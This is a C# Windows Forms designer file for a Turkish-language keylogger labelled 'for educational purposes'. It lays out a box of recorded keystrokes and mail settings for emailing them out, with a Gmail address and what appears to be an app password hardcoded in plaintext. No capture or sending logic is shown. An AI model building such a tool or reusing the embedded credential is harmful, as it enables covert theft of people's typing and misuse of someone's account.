namespace Keylogger
{
    partial class Form1
    {
        private System.ComponentModel.IContainer components = null;
        private System.Windows.Forms.TextBox txtTuslar;
        private System.Windows.Forms.Label lblDurum;
        private System.Windows.Forms.TextBox txtGonderenMail;
        private System.Windows.Forms.TextBox txtGonderenSifre;
        private System.Windows.Forms.TextBox txtAliciMail;
        private System.Windows.Forms.Label label1;
        private System.Windows.Forms.Label label2;
        private System.Windows.Forms.Label label3;
        private System.Windows.Forms.Button btnManuelGonder;
        private System.Windows.Forms.Button btnTemizle;
        private System.Windows.Forms.GroupBox groupBox1;
        private System.Windows.Forms.GroupBox groupBox2;

        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        private void InitializeComponent()
        {
            this.txtTuslar = new System.Windows.Forms.TextBox();
            this.lblDurum = new System.Windows.Forms.Label();
            this.txtGonderenMail = new System.Windows.Forms.TextBox();
            this.txtGonderenSifre = new System.Windows.Forms.TextBox();
            this.txtAliciMail = new System.Windows.Forms.TextBox();
            this.label1 = new System.Windows.Forms.Label();
            this.label2 = new System.Windows.Forms.Label();
            this.label3 = new System.Windows.Forms.Label();
            this.btnManuelGonder = new System.Windows.Forms.Button();
            this.btnTemizle = new System.Windows.Forms.Button();
            this.groupBox1 = new System.Windows.Forms.GroupBox();
            this.groupBox2 = new System.Windows.Forms.GroupBox();
            this.groupBox1.SuspendLayout();
            this.groupBox2.SuspendLayout();
            this.SuspendLayout();
            // 
            // txtTuslar
            // 
            this.txtTuslar.Font = new System.Drawing.Font("Consolas", 10F);
            this.txtTuslar.Location = new System.Drawing.Point(15, 40);
            this.txtTuslar.Multiline = true;
            this.txtTuslar.Name = "txtTuslar";
            this.txtTuslar.ReadOnly = true;
            this.txtTuslar.ScrollBars = System.Windows.Forms.ScrollBars.Vertical;
            this.txtTuslar.Size = new System.Drawing.Size(550, 150);
            this.txtTuslar.TabIndex = 0;
            // 
            // lblDurum
            // 
            this.lblDurum.AutoSize = true;
            this.lblDurum.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Bold);
            this.lblDurum.ForeColor = System.Drawing.Color.Green;
            this.lblDurum.Location = new System.Drawing.Point(15, 15);
            this.lblDurum.Name = "lblDurum";
            this.lblDurum.Size = new System.Drawing.Size(50, 15);
            this.lblDurum.TabIndex = 1;
            this.lblDurum.Text = "Durum";
            // 
            // txtGonderenMail
            // 
            this.txtGonderenMail.Location = new System.Drawing.Point(120, 25);
            this.txtGonderenMail.Name = "txtGonderenMail";
            this.txtGonderenMail.Size = new System.Drawing.Size(250, 22);
            this.txtGonderenMail.TabIndex = 2;
            this.txtGonderenMail.Text = "erkandemiral2004@gmail.com";
            // 
            // txtGonderenSifre
            // 
            this.txtGonderenSifre.Location = new System.Drawing.Point(120, 60);
            this.txtGonderenSifre.Name = "txtGonderenSifre";
            this.txtGonderenSifre.PasswordChar = '*';
            this.txtGonderenSifre.Size = new System.Drawing.Size(250, 22);
            this.txtGonderenSifre.TabIndex = 3;
            this.txtGonderenSifre.Text = "mantgwsgcjrayrsl";
            // 
            // txtAliciMail
            // 
            this.txtAliciMail.Location = new System.Drawing.Point(120, 95);
            this.txtAliciMail.Name = "txtAliciMail";
            this.txtAliciMail.Size = new System.Drawing.Size(250, 22);
            this.txtAliciMail.TabIndex = 4;
            this.txtAliciMail.Text = "erkandemiral2004@gmail.com";
            // 
            // label1
            // 
            this.label1.AutoSize = true;
            this.label1.Location = new System.Drawing.Point(15, 28);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(96, 16);
            this.label1.TabIndex = 5;
            this.label1.Text = "Gönderen Mail:";
            // 
            // label2
            // 
            this.label2.AutoSize = true;
            this.label2.Location = new System.Drawing.Point(15, 63);
            this.label2.Name = "label2";
            this.label2.Size = new System.Drawing.Size(38, 16);
            this.label2.TabIndex = 6;
            this.label2.Text = "Şifre:";
            // 
            // label3
            // 
            this.label3.AutoSize = true;
            this.label3.Location = new System.Drawing.Point(15, 98);
            this.label3.Name = "label3";
            this.label3.Size = new System.Drawing.Size(65, 16);
            this.label3.TabIndex = 7;
            this.label3.Text = "Alıcı Mail:";
            // 
            // btnManuelGonder
            // 
            this.btnManuelGonder.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(0)))), ((int)(((byte)(122)))), ((int)(((byte)(204)))));
            this.btnManuelGonder.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.btnManuelGonder.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Bold);
            this.btnManuelGonder.ForeColor = System.Drawing.Color.White;
            this.btnManuelGonder.Location = new System.Drawing.Point(390, 25);
            this.btnManuelGonder.Name = "btnManuelGonder";
            this.btnManuelGonder.Size = new System.Drawing.Size(150, 40);
            this.btnManuelGonder.TabIndex = 8;
            this.btnManuelGonder.Text = "Mail Gönder";
            this.btnManuelGonder.UseVisualStyleBackColor = false;
            this.btnManuelGonder.Click += new System.EventHandler(this.btnManuelGonder_Click);
            // 
            // btnTemizle
            // 
            this.btnTemizle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(192)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            this.btnTemizle.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.btnTemizle.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Bold);
            this.btnTemizle.ForeColor = System.Drawing.Color.White;
            this.btnTemizle.Location = new System.Drawing.Point(390, 77);
            this.btnTemizle.Name = "btnTemizle";
            this.btnTemizle.Size = new System.Drawing.Size(150, 40);
            this.btnTemizle.TabIndex = 9;
            this.btnTemizle.Text = "Temizle";
            this.btnTemizle.UseVisualStyleBackColor = false;
            this.btnTemizle.Click += new System.EventHandler(this.btnTemizle_Click);
            // 
            // groupBox1
            // 
            this.groupBox1.Controls.Add(this.label1);
            this.groupBox1.Controls.Add(this.btnTemizle);
            this.groupBox1.Controls.Add(this.txtGonderenMail);
            this.groupBox1.Controls.Add(this.btnManuelGonder);
            this.groupBox1.Controls.Add(this.txtGonderenSifre);
            this.groupBox1.Controls.Add(this.label3);
            this.groupBox1.Controls.Add(this.txtAliciMail);
            this.groupBox1.Controls.Add(this.label2);
            this.groupBox1.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.groupBox1.Location = new System.Drawing.Point(15, 205);
            this.groupBox1.Name = "groupBox1";
            this.groupBox1.Size = new System.Drawing.Size(550, 135);
            this.groupBox1.TabIndex = 10;
            this.groupBox1.TabStop = false;
            this.groupBox1.Text = "Mail Ayarları";
            // 
            // groupBox2
            // 
            this.groupBox2.Controls.Add(this.txtTuslar);
            this.groupBox2.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F);
            this.groupBox2.Location = new System.Drawing.Point(5, 5);
            this.groupBox2.Name = "groupBox2";
            this.groupBox2.Size = new System.Drawing.Size(575, 195);
            this.groupBox2.TabIndex = 11;
            this.groupBox2.TabStop = false;
            this.groupBox2.Text = "Kaydedilen Tuşlar";
            // 
            // Form1
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(584, 351);
            this.Controls.Add(this.groupBox2);
            this.Controls.Add(this.groupBox1);
            this.Controls.Add(this.lblDurum);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle;
            this.MaximizeBox = false;
            this.Name = "Form1";
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "Klavye Kaydedici - EĞİTİM AMAÇLI";
            this.Load += new System.EventHandler(this.Form1_Load);
            this.groupBox1.ResumeLayout(false);
            this.groupBox1.PerformLayout();
            this.groupBox2.ResumeLayout(false);
            this.groupBox2.PerformLayout();
            this.ResumeLayout(false);
            this.PerformLayout();
        }
    }
}